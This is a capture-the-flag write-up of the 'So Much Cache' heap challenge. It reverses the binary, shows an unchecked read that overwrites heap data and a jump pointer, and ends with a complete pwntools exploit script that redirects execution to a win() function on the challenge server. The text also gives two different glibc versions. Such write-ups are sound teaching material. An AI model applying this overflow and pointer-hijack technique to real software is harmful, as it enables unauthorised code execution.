# Challenge Name: So Much Cache


## Description:


Author: @WittsEnd

If you couldn't tell, we're all about the dollar bills... CTF challenges for Blackjack, moneybags, and so much cash!!


This binary is statically linked, though the libc for this binary is version 2.28. We've provided the libc below for your reference.


## Solution:


When we run the binary, it displays this menu:


```
└─$ ./so_much_cache  
+---------------------+
|         Menu        |
+---------------------+
| 1. allocate memory  |
| 2. freeing memory   |
| 3. exit             |
| 4. Prepare Jump!    |
| 5. Jump!            |
+---------------------+
| select [1-5] : 
```


From the menu, all the given options are clear. Let's see how the binary works.


![Screenshot from 2024-05-31 12-35-14](https://github.com/Parshva87/CTF-Writeup/assets/55111077/62db1487-6cca-4460-b323-4d049c934a01)


The first prompt takes the user input for the size (which allocates the memory) and then takes the user input for the data to save to the allocated memory.


Let's analyze the binary and see how the `allocate_memory` function works. (I used Binary Ninja to analyze this binary.)


This is how the `main()` function looks:


![Screenshot from 2024-05-26 22-04-22](https://github.com/Parshva87/CTF-Writeup/assets/55111077/3534a520-ac08-4102-93ae-e48ad6dee0f3)


From the name of the function `create_memory()`, it is clear that it allocates the memory, and the `release_memory()` function frees the allocated memory.


![Screenshot from 2024-05-31 11-51-34](https://github.com/Parshva87/CTF-Writeup/assets/55111077/9c01db9f-dd11-4eb3-b4d2-46f6e632d038)


When we look look at the options `4. Prepare Jump! ` and `5. Jump!`,

![Screenshot from 2024-05-31 17-19-25](https://github.com/Parshva87/CTF-Writeup/assets/55111077/756ef012-7e5f-49e6-a092-78cb7307011b)


In choice 4 `(Prepare Jump)`, it simply allocates 24 (0x18) bytes of memory and assigns the address of that allocated memory to the variable `var_10`. Then, in choice 5 `(Jump)`, it jumps to the address `var_10` chosen by the user (1, 2, or 3). (Explained clearly later)


![Screenshot from 2024-05-31 18-19-10](https://github.com/Parshva87/CTF-Writeup/assets/55111077/95dd0110-c28f-48cd-83ea-10ed19c4d751)


While looking at the code of the `create_memory()` and `release_memory()` functions, I stumbled upon a function that will be our main target to get the flag: `win()`.


![Screenshot from 2024-05-31 11-50-53](https://github.com/Parshva87/CTF-Writeup/assets/55111077/55b6ceb3-e9f5-4345-abe8-f0847b699c80)


Now, Let's break down how the `create_memory()` function works:


```
00400abb  uint64_t create_memory()
00400abb  {
00400acd      _IO_printf("[?] size : ", 0);
00400ae3      __isoc99_scanf(&data_4a1bc8, 0);              <--- It reads from the user input for size
00400af2      _IO_printf("[?] data : ", 0);
00400aff      int32_t var_c;                                <--- Then it assigned the user input to the varible c 
00400aff      if (var_c <= 0x88)                            <--- This if conditions checks, if the varible c it less than or equal to 136 (0x88) 
00400afa      {
00400b0e          buf = __libc_malloc(((int64_t)var_c));    <--- If the user input it less or equal to 136, the it set the buffer size to user input. 
00400b21          buf;
00400b30          read();                                   <--- Then it read for the data 
00400b30      }
00400b41      return _IO_puts("[+] memory allocated!");
00400b35  }

```


The vulnerability in the `create_memory()` function is that it sets the buffer size to the entered value of input `[size]` (var_c), but when it reads the input and saves it into `[data]`, it does not check how much data the user is passing into the input.


![Screenshot from 2024-05-31 15-36-32](https://github.com/Parshva87/CTF-Writeup/assets/55111077/d7b2e3a0-950f-4025-9f6d-aac2034b968c)


This means we can overwrite the top chunk value, and this vulnerability is known as the House of Force.


Let's run the binary in pwndbg and try to overwrite the top chunk.


Run the binary, set the size to 20, and enter more than 20 characters in the data to overwrite the top chunk.


![Screenshot from 2024-05-31 15-58-31](https://github.com/Parshva87/CTF-Writeup/assets/55111077/7258ec5c-61cd-4682-b721-3f15123f84e9)


Then hit `ctrl + c` to break the program flow and type `vis_heap_chunks`


![Screenshot from 2024-05-31 15-58-50](https://github.com/Parshva87/CTF-Writeup/assets/55111077/162ce9d2-33e4-46dc-8e5e-293abcdd07b8)


Since the binary is compiled statically, we need to set the glibc version used to compile the binary in pwndbg.


The `libc.so.6` file is provided with the challenge binary. We can find the version from the `libc.so.6` file using the `strings` command.


` strings libc.so.6 | grep glibc `


![Screenshot from 2024-05-31 16-18-31](https://github.com/Parshva87/CTF-Writeup/assets/55111077/f03a6728-ca4a-4fdb-a000-42c65ef85711)


Use the command `set glibc 2.23` to set the glibc version and `r` or `run` to re-run the program.


![Screenshot from 2024-05-31 16-44-45](https://github.com/Parshva87/CTF-Writeup/assets/55111077/40e618cf-8d04-420d-9055-95f8d23723c5)


Now, let's see if we can view the data in the allocated heap chunks and check if the top chunk has been overwritten with our input.

![Screenshot from 2024-05-31 18-40-31](https://github.com/Parshva87/CTF-Writeup/assets/55111077/c32f7b16-113d-4750-8af0-f4a62cbfbeeb)


Use `vis_heap_chunks` command to Visualize heap chunks.


![Screenshot from 2024-05-31 18-41-34](https://github.com/Parshva87/CTF-Writeup/assets/55111077/0fb52166-0f71-40c5-b5fc-fe6604b0399a)


In the above screenshot we can see that our top chunk is overwritten with address `0x6161616161616161` aaaaaaaa 


Now Let's see what happens if we allocate the memory one more time with options 1.


Use the `c` or `continue` command to continue the program flow. Choose option 1, and this time, we will enter only 4 `b`s to see how our other allocated memory looks.


![Screenshot from 2024-05-31 19-01-06](https://github.com/Parshva87/CTF-Writeup/assets/55111077/a2e2d2c1-51e7-4d13-8ad9-65add52214fb)


Now with `vis_heap_chunks` when we look at our new allocated memory, We can see our entered 4 `b`'s and also our previously entered `a`'s in that newly allocated memory.


![Screenshot from 2024-05-31 19-07-57](https://github.com/Parshva87/CTF-Writeup/assets/55111077/71b8db71-ba38-41f5-8bc7-243a82d2959e)


This means, when we overwrite the top chunk, we are also writing over data at memory addresses beyond the allocated heap chunks. That's why when we allocate a new chunk, it has our previously entered data.


Now, let's try the same thing: 


1. First, overwrite the top chunk.
2. Then, instead of allocating a new chunk with option `1. allocate memory`, this time we will use option `4. Prepare Jump!` to allocate memory.
3. Then will choose option `5. Jump!` and jump to the number `1`. (Options 1, 2, and 3 are given when we select option 5).


`1. First, overwrite the top chunk:`


This time, instead of `a`, I used the string `aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllll` to see which part of the entered string we will jump to when we choose option `5`.


![Screenshot from 2024-05-31 19-25-17](https://github.com/Parshva87/CTF-Writeup/assets/55111077/749c64f9-3c63-42c9-b1b4-fb6a1d7074b3)


Let's do `vis_heap_chunks` to confirm that we overwrite the top chunk.


![Screenshot from 2024-05-31 19-28-49](https://github.com/Parshva87/CTF-Writeup/assets/55111077/bf6996a6-b9e5-45d1-8c94-d36f443d3fbc)


To confirm that we have also overwritten the data beyond the allocated chunks, we can use the examine command `x`:


`x/16gx address` (Examine 16 giant of data in hex format at a specified address.)


![Screenshot from 2024-05-31 19-32-27](https://github.com/Parshva87/CTF-Writeup/assets/55111077/5daaadc7-780a-4a65-8694-763d96c30804)


In the above screenshot, we can confirm that memory after the top chunk is also overwritten with our data.


`2. Allocate memory using option 4. Prepare Jump!`


Use `c` to continue, then press `Enter` to print the menu, and select `4` to allocate memory (Prepare Jump!).


![Screenshot from 2024-05-31 19-59-05](https://github.com/Parshva87/CTF-Writeup/assets/55111077/e1b53dc4-11f1-4a79-b8c7-5106f7d6964e)


 Let's see how our allocated heap chunks look with the `vis_heap_chunks` command.


![Screenshot from 2024-05-31 19-52-01](https://github.com/Parshva87/CTF-Writeup/assets/55111077/00aafd1c-1a79-4964-99a7-fdb4598d8303)


In the above screenshot we can see that our newly allocated heap chunk has our previuos entered data.


`3. Now let's Jump!` 


Use `c` to continue, then press `Enter` to print the menu, and select `5`. Then, enter `1` to jump to location 1.


![Screenshot from 2024-05-31 20-06-03](https://github.com/Parshva87/CTF-Writeup/assets/55111077/d56e8e7e-0fa6-4f0b-a9b1-f3226c9edda7)


In the above screenshot, we can see that when we jump to location 1, we get the `Segmentation fault` error. In the `DISASM` section, we can see that the program is trying to call the address `0x6a6a6a6a69696969`, which does not exist. This error occurs because the address `0x6a6a6a6a69696969` that the program is trying to call is actually from our entered data `iiiijjjj`.


Also, previously when we choose the option `4` to set the jump and looked at the heap chunks data, the first 8-byte data was `0x6a6a6a6a69696969 (iiiijjjj) ` 


![Screenshot from 2024-05-31 20-18-37](https://github.com/Parshva87/CTF-Writeup/assets/55111077/1089b68b-3c58-423f-889f-abb6e885893f)


So, if we replace the `iiiijjjj (0x6a6a6a6a69696969)` with the address of the `win()` function and then jump to that location, the program will call the `win()` function.


`payload = b'aaaabbbbccccddddeeeeffffgggghhhh' + win()`


Let's write the pwntools script to automate our exploit. 


# Final exploit: -


```
from pwn import *

binary = 'so_much_cache'
elf = context.binary = ELF(binary)

def start():
    if args.GDB:
        return gdb.debug(elf.path)
    if args.REMOTE:
        return remote("challenge.nahamcon.com", 30848)
    else:
        return process(elf.path)

def allocate(size,data):
   p.recvuntil(b'[1-5] :')
   p.sendline(b'1')
   p.recvuntil(b'size :')
   p.sendline(size)
   p.recvuntil(b'data :')
   p.sendline(data)

def setjump():
   p.recvuntil(b'[1-5] :')
   p.sendline(b'4')

def tojump(numb):
   p.recvuntil(b'[1-5] :')
   p.sendline(b'5')
   p.recvuntil(b'(1, 2, or 3)')
   p.sendline(numb)
   flag = p.recvuntil(b'}\n').decode().strip()
   log.info(flag)

p = start() 

win_function = elf.sym['win']   # 0x004009ae

log.info("Overwriting the top chunk.",)

#aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllll
#aaaabbbbccccddddeeeeffffgggghhhh + win()
# a*32 + win_function

payload = b'a'*32 + p64(win_function)

allocate(b'20' , payload)

log.info("Set the jump!")
setjump()

log.info("Jump to win()")
tojump(b'1')

#p.interactive()

```

